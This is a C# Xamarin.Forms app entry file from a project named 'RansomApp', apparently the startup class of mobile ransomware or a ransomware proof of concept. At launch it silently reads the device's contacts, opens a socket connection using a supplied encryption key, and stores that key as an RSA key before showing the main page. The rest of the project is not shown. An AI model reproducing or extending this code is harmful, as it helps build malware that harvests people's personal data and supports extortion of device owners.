using Prism;
using Prism.Ioc;
using RansomApp.Clients;
using RansomApp.Constants;
using RansomApp.Services.Contacts;
using RansomApp.ViewModels;
using RansomApp.Views;
using System;
using System.Collections.Generic;
using Xamarin.Essentials.Implementation;
using Xamarin.Essentials.Interfaces;
using Xamarin.Forms;

namespace RansomApp
{
    public partial class App
    {
        public string encryptKey;

        public App(IPlatformInitializer initializer,string key): base(initializer)
        {
            encryptKey = key;
        }

        protected override async void OnInitialized()
        {
            InitializeComponent();


            var cs = new ContactsService();
            List<Models.Contact> data = await cs.GetContactsAsync();

           SocketClient.Connect(encryptKey);
            Singleton.Singleton.Instance.rsaKey = encryptKey;

            await NavigationService.NavigateAsync(Pages.MainPage);
        }

        protected override void RegisterTypes(IContainerRegistry containerRegistry)
        {
            containerRegistry.RegisterSingleton<IAppInfo, AppInfoImplementation>();

            containerRegistry.RegisterForNavigation<NavigationPage>();
            containerRegistry.RegisterForNavigation<MainPage, MainPageViewModel>(Pages.MainPage);
        }
    }
}
